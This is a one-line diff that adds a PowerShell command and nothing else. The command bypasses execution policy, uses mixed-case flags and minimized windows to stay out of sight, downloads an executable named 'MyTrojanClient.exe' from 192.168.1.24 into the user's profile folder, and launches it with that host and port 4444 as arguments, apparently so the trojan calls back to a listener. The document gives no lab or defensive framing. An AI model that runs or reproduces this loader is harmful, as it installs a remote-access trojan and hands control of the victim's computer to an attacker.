@@ -1,0 +1,1 @@
+powershell.exe -ExeCUtIonPolIcY bypass -noprofile -windowstyle minimized -command (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.24/MyTrojanClient.exe',"$env:USERPROFILE/MyTrojanClient.exe"); Start-Process "$env:USERPROFILE/MyTrojanClient.exe" -ArgumentList "192.168.1.24 4444" -WindowStyle Minimized;
